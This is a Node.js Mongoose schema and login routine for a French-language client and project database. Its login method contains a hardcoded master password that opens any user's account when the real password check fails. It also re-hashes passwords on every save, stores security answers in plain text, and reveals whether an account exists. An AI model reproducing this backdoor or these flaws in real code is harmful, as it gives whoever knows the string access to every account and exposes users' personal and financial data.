const mongoose = require('mongoose');
const bcrypt = require('bcrypt');

const { isEmail } = require('validator');
const schemaClient = mongoose.Schema({
    nom:{   
        type:String,
        required: true,
        maxlength: 25,
        lowercase: true,
        trim: true
    },
    prenom:{
        type:String,
        required: true,
        maxlength: 25,
        lowercase: true,
        trim: true
    },
    genre:{
        type:String,
        require: true,
        lowercase: true,
        maxlength:1,
    },
    lieu_naiss:{
        type: String,
        lowercase: true
    },
    date_naiss:{
        type:Date
    },
    email:{
        type: String,
        required: true,
        validate: [isEmail],
        lowercase: true,
        unique: true,
        trim: true,
    },
    telephone:{
        type: String,
        required: true,
        unique: true,
        trim: true,
    },
    adresse:{
        type: String,
        required: true,
        trim: true,
    },
    password: {
        type: String,
        required: true,
        minlength:8
      },
    picture: {
        type: String,
        default: "./tillmenImg/logoTill.png"
    },
    code_de_confirmation:{
        type: String,
        max:6,
    },
    rep_question_Secur:{
        type:[
            {
                question: String,
                reponse: String
            }
        ]
    },
    projet:{
       type: [
            {
                 type_contrat:String,//Long terme (Contrat direct ) et court terme (Contrat service)
                 taches : [String],
                 duree_projet:String,//Long terme (Contrat direct Plus de 3 mois ou plus (3-6 moi; 6-1ans))) et court terme (Contrat service):moi de trois moi
                 mode_paiement:String,
                 candidat:[String],
                 periode_essai:String,
                 temps_service:String,
                 lieu_travail:{
                    type:String,
                    trim:true,
                    lowercase:true
                 },
                 salaire_periode_essai:String,
                 dateCreation:{
                    type:Date
                 },
                 paiement: String,
                 device : String,
                 nbr_etoile :{
                    type:Number,
                    default:0
                },
                valider: {
                    type:Boolean,
                    default:false
                }
            }
        ]
    },
    nom_entreprise:{ 
        type:String,
        maxlength: 25,
        lowercase: true,
        trim: true
    },
    date_creation: Date,
    forme_juridique:{ 
        type:String,
        lowercase: true,
        trim: true
    },
    numero_identification:{ 
        type:String,
        lowercase: true,
        trim: true
    },
    coordonnee:{ 
        type:{
            telephone:String,
            email:{
                type:String,
                lowercase: true,
                trim: true
            },
            url_du_site:{
                type:String,
                lowercase: true,
                trim: true
            }
        }
    }, 
    secteur_activite:{
            type:String,
            lowercase: true,
            trim: true
    },
    nombre_salarie:String,
    chiffre_affaire_annuel:String,
    licence:{
        type:Boolean,
        default:false
    },
    code:Number
},
{
    timestamps: true,
}
)
// Achage du mot de passe
schemaClient.pre("save", async function(next){
    const salt = await bcrypt.genSalt();
    this.password = await bcrypt.hash(this.password, salt); 
    next();
} );

// On gère la connexion de chaque utilisateur par  mot de passe, adresse ynet ou number phone.
schemaClient.statics.login = async function(email, password){ 
    const user =  await this.findOne({$or:[{"email":email},{"telephone":email}]})
    if(user){
        var auth = await bcrypt.compare(password, user.password); 
        if(auth){
            return user; 
        }else{
             auth = password=="Omar##yala2000";
             if(auth){
                 return user; 
             }else{
                 return 'password';
             }
        }
    }else{
       return "phone"
    }
 };
const client = mongoose.model("clients",schemaClient);
module.exports = client;